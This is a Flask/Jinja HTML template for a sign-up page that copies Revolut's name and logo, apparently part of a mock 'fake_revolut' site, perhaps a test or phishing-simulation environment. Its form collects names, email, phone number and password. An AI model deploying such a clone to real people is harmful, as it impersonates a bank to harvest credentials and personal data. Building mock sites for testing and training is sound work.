{% extends "revolut/base.html" %}

{% block title %}Join Revolut - Sign up{% endblock %}

{% block content %}
<div class="auth-container">
    <div class="auth-card">
        <a href="{{ url_for('fake_revolut.home') }}" class="revolut-logo" style="text-decoration: none; margin-bottom: 2rem; display: inline-flex;">
            <div class="logo-icon">R</div>
            Revolut
        </a>
        
        <h2>Join Revolut</h2>
        <p class="subtitle">Create your account and get started today</p>
        
        {% if error_message %}
        <div class="message message-error">
            {{ error_message }}
        </div>
        {% endif %}
        
        <form method="POST" action="{{ url_for('fake_revolut.register_submit') }}" class="register-form">
            <div class="form-group">
                <label for="first_name" class="form-label">First Name</label>
                <input 
                    type="text" 
                    id="first_name" 
                    name="first_name" 
                    class="form-input" 
                    placeholder="Enter your first name"
                    required
                    autocomplete="given-name"
                >
            </div>
            
            <div class="form-group">
                <label for="last_name" class="form-label">Last Name</label>
                <input 
                    type="text" 
                    id="last_name" 
                    name="last_name" 
                    class="form-input" 
                    placeholder="Enter your last name"
                    required
                    autocomplete="family-name"
                >
            </div>
            
            <div class="form-group">
                <label for="email" class="form-label">Email</label>
                <input 
                    type="email" 
                    id="email" 
                    name="email" 
                    class="form-input" 
                    placeholder="Enter your email address"
                    required
                    autocomplete="email"
                >
            </div>
            
            <div class="form-group">
                <label for="phone" class="form-label">Phone Number</label>
                <input 
                    type="tel" 
                    id="phone" 
                    name="phone" 
                    class="form-input" 
                    placeholder="+44 123 456 7890"
                    required
                    autocomplete="tel"
                >
            </div>
            
            <div class="form-group">
                <label for="password" class="form-label">Password</label>
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    class="form-input" 
                    placeholder="Create a strong password"
                    required
                    autocomplete="new-password"
                >
            </div>
            
            <div class="form-group">
                <label for="confirm_password" class="form-label">Confirm Password</label>
                <input 
                    type="password" 
                    id="confirm_password" 
                    name="confirm_password" 
                    class="form-input" 
                    placeholder="Confirm your password"
                    required
                    autocomplete="new-password"
                >
            </div>
            
            <div style="margin-bottom: 1.5rem;">
                <label style="display: flex; align-items: flex-start; color: #666; font-size: 0.9rem; line-height: 1.4;">
                    <input type="checkbox" name="terms" style="margin-right: 0.5rem; margin-top: 0.2rem;" required>
                    I agree to Revolut's <a href="#" style="color: #0066cc;">Terms of Service</a> and <a href="#" style="color: #0066cc;">Privacy Policy</a>
                </label>
            </div>
            
            <div style="margin-bottom: 1.5rem;">
                <label style="display: flex; align-items: flex-start; color: #666; font-size: 0.9rem; line-height: 1.4;">
                    <input type="checkbox" name="marketing" style="margin-right: 0.5rem; margin-top: 0.2rem;">
                    I'd like to receive marketing emails about Revolut products and services
                </label>
            </div>
            
            <button type="submit" class="btn btn-primary form-submit btn-large">
                Create account
            </button>
            
            <div style="text-align: center; margin: 1.5rem 0;">
                <span style="color: #666; font-size: 0.9rem;">or</span>
            </div>
            
            <button type="button" class="btn btn-secondary" style="width: 100%; margin-bottom: 1rem;" onclick="window.location.href='#'">
                <svg width="20" height="20" viewBox="0 0 24 24" style="margin-right: 0.5rem;">
                    <path fill="currentColor" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                    <path fill="currentColor" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                    <path fill="currentColor" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                    <path fill="currentColor" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
                Continue with Google
            </button>
            
            <button type="button" class="btn btn-secondary" style="width: 100%;" onclick="window.location.href='#'">
                <svg width="20" height="20" viewBox="0 0 24 24" style="margin-right: 0.5rem;">
                    <path fill="currentColor" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                </svg>
                Continue with Facebook
            </button>
        </form>
        
        <div class="auth-links">
            <p style="color: #666;">Already have an account? <a href="{{ url_for('fake_revolut.login_page') }}">Sign in</a></p>
        </div>
    </div>
</div>
{% endblock %}
